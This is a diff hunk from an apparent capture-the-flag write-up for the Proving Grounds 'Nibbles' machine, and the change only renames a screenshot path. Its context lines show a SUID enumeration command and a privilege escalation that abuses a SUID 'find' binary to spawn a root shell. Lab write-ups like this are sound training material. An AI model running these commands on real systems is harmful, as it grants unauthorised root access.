@@ -84,7 +84,7 @@ Enumerate SUIDs `$ find / -perm -u=s -type f 2>/dev/null`.
 ./find . -exec /bin/sh -p \; -quit
 ```
 
-![img](/assets/images/CTF/Proving_Grounds/Nibbles/root.png)
+![img](/assets/images/CTF/Proving_Grounds/Nibbles/Root.png)
 
 **Root Obtained**
 
